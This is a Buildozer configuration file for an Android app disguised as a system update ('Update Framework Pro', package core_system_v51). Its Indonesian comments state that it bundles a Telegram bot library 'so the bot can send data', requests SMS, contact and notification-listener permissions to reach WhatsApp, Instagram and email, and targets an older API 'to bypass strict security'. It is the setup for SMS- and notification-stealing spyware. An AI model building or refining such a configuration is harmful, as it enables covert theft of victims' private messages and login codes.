[app]
title = Update Framework Pro
package.name = core_system_v51
package.domain = com.core.internal
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 5.1

# Library wajib agar bot bisa kirim data (requests & certifi penting!)
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi

# Izin Komplet: SMS, Kontak, dan Pintu Masuk ke WA/IG/Email (BIND_NOTIFICATION_LISTENER)
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS, BIND_NOTIFICATION_LISTENER_SERVICE

# Arsitektur & Keamanan (API 28 untuk bypass keamanan ketat)
android.api = 28
android.minapi = 21
android.ndk = 25b
android.private_storage = True
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = True

# Menambahkan library tambahan untuk memastikan notifikasi terbaca
android.gradle_dependencies = "com.android.support:support-v4:28.0.0"

[buildozer]
log_level = 2
warn_on_root = 1
